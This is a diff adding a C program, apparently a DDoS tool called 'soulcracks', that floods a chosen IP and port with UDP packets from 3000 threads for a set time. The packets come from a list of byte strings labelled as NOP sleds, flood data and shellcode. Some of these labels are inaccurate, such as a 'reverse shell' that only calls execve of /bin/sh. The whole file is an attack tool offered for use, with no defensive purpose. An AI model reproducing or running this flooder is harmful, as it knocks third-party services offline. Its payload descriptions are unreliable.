@@ -1,0 +1,168 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+#include <time.h>
+
+void usage() {
+    printf("Usage: ./soulcracks ip port time threads\n");
+    exit(1);
+}
+
+struct thread_data {
+    char *ip;
+    int port;
+    int time;
+};
+
+void *attack(void *arg) {
+    struct thread_data *data = (struct thread_data *)arg;
+    int sock;
+    struct sockaddr_in server_addr;
+    time_t endtime;
+
+    // Enhanced, more powerful payloads
+    char *payloads[] = {
+        // Payload 1: Long sequence of NOP (No-Operation) instructions, often used in buffer overflows or exploitation.
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
+
+        // Payload 2: Random data, could represent an attempt to flood a server with unrecognizable data
+        "\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00\xd9\x00"
+        "\x22\x33\x44\x55\x66\x77\x88\x99\xAA\xBB\xCC\xDD\xEE\xFF\x00\x11\x22\x33\x44\x55",
+
+        // Payload 3: A more complex set of bytes, simulating attack vectors like SQL injection or buffer overflow payloads
+        "\x72\xfe\x1d\x13\x00\x00\x72\xfe\x1d\x13\x00\x00\x72\xfe\x1d\x13\x00\x00\x72\xfe"
+        "\x01\x00\x00\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e"
+        "\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35"
+        "\x2e\x32\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46",
+
+        // Payload 4: A potential buffer overflow scenario, long string of repetitive characters
+        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53"
+        "\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66",
+        
+        // Payload 5: A highly repetitive payload to flood the server with a large volume of data
+        "\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50"
+        "\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50",
+
+        // Payload 6: XOR encoding pattern (simple example of obfuscation)
+        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f"
+        "\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x4f",
+
+        // Payload 7: A large random data buffer, potentially simulating a data flood
+        "\x34\x56\x78\x90\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
+        "\x34\x56\x78\x90\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
+        "\x34\x56\x78\x90\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01",
+
+        // Payload 8: Randomized byte values to simulate malicious data
+        "\xff\x0a\xbb\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd"
+        "\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\x11\x22\x33",
+
+        // Payload 9: A sequence mimicking a more sophisticated attack like a shellcode
+        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x02\x89\xe1"
+        "\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x68\xc0\xa8\x00\x68\x66\x69\x6e"
+        "\x64\x68\x2f\x2f\x2f\x62\x89\xe3\xb0\x0b\xcd\x80",
+
+        // Payload 10: Another flood payload, much longer in size to simulate a heavy attack
+        "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+        "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+        "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49",
+
+        // Payload 11: Obfuscated pattern using different encoding methods
+        "\x1a\x2b\x3c\x4d\x5e\x6f\x7a\x8b\x9c\xab\xbc\xcd\xde\xef\xfe\xad"
+        "\xbc\xde\xf0\x2a\x3b\x4c\x5d\x6e\x7f\x80\x91\xa2\xb3\xc4\xd5\xe6",
+
+        // Payload 12: A long string of random characters that can simulate flooding
+        "\x2b\x3a\x48\x59\x63\x6e\x7d\x80\x91\xa0\xb1\xb2\xb3\xb4\xb5\xb6"
+        "\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6"
+        "\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6"
+        "\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6",
+
+        // Payload 13: Shellcode to invoke a reverse shell
+        "\x31\xc0\x50\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+        "\x0b\xcd\x80",
+
+        // Payload 14: A long string of repetitive characters to test buffer limits
+        "\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
+        "\x66\x66\x66\x66\x66\x66\x66\x66",
+
+        // Payload 15: Randomized string to simulate malicious input
+        "\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
+        "\x23\x45\x67\x89\xab\xcd\xef\x01",
+
+        // Payload 16: An even longer buffer to simulate large-scale attack
+        "\x10\x20\x30\x40\x50\x60\x70\x80\x90\xa0\xb0\xc0\xd0\xe0\xf0"
+        "\x00\x10\x20\x30\x40\x50\x60\x70\x80\x90\xa0\xb0\xc0\xd0\xe0",
+
+        // Payload 17: Large block of NOPs to cause buffer overflow with intentional misalignment
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
+
+        // Payload 18: Complex XOR obfuscation pattern
+        "\x23\x1f\x6c\x1b\x2e\x77\x8c\x16\x6d\x34\x41\x27\x09\x60\x72\x3b"
+        "\x0c\x64\x8b\x5e\x43\x3a\x26\x53\x4b\x11\x68\x0e\x15\x72\x8e\x7b"
+    };
+
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        pthread_exit(NULL);
+    }
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(data->port);
+    server_addr.sin_addr.s_addr = inet_addr(data->ip);
+
+    endtime = time(NULL) + data->time;
+
+    while (time(NULL) <= endtime) {
+        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
+            sendto(sock, payloads[i], strlen(payloads[i]), 0,
+                   (const struct sockaddr *)&server_addr, sizeof(server_addr));
+        }
+    }
+
+    close(sock);
+    pthread_exit(NULL);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 5) {
+        usage();
+    }
+
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int time = atoi(argv[3]);
+
+    int threads = 3000;  // Increased threads to 3000
+
+    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
+
+    for (int i = 0; i < threads; i++) {
+        struct thread_data *data = malloc(sizeof(struct thread_data));
+        data->ip = ip;
+        data->port = port;
+        data->time = time;
+
+        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
+            free(data);
+            free(thread_ids);
+            exit(1);
+        }
+    }
+
+    for (int i = 0; i < threads; i++) {
+        pthread_join(thread_ids[i], NULL);
+    }
+
+    free(thread_ids);
+    return 0;
+}
+
+
+
+
+
+
